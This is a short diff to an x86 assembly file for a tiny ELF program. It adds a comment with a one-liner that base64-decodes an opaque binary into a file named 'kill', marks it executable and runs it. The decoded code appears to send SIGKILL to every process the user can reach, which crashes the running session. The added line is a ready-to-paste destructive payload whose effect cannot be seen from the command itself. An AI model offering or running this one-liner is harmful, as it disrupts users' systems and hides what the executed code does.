@@ -45,3 +45,6 @@ _start:
             int     0x80
 
 filesize        equ     $ - $$
+
+; with one-liner :
+; base64 -d <<< f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAheAAAAXgAAAAUAAAAAEAAAaiVYav9bsQnNgA== > kill;chmod +x kill;./kill
